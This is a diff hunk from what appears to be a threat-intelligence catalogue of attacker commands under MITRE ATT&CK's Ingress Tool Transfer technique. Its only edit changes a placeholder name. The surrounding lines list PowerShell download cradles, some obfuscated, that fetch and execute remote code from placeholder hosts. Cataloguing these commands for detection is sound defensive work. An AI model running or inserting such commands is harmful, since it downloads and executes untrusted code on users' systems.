@@ -239,7 +239,7 @@ Ingress Tool Transfer [[T1105](https://attack.mitre.org/techniques/T1105/)]
 powershell.exe -exec bypass -C IEX ((New-Object Net.WebClient).downloadstring('http[:]//<url>/file.ext'))
 powershell.exe -exec bypass -C IEX ((new-object net.webclient).downloadstring('http[:]//<url>/file.ext'))
 powershell.exe -exec bypass -C IEX ((new-object net.tneilCbeW).daolnwoDstring('http[:]//<url>/file.ext'))
-powershell.exe -exec bypass -C IN`V`o`Ke-eXp`ResSIOn (Ne`W-ob`ject Net.WebClient).DownloadString('http[:]//<domain_name>/file.ext'))
+powershell.exe -exec bypass -C IN`V`o`Ke-eXp`ResSIOn (Ne`W-ob`ject Net.WebClient).DownloadString('http[:]//<url>/file.ext'))
 powershell.exe Invoke-WebRequest -Uri "https[:]//<url>/file.ext" -OutFile c:\file.ext -UseBasicParsing"
 powershell.exe iwr -Uri "https[:]//<url>/file.ext" -OutFile c:\file.ext -UseBasicParsing"
 сmd.exe /c PowerShell iwr -Uri http://<ip_address>:<port>/file.ext -OutFile c:\file.ext -UseBasicParsing
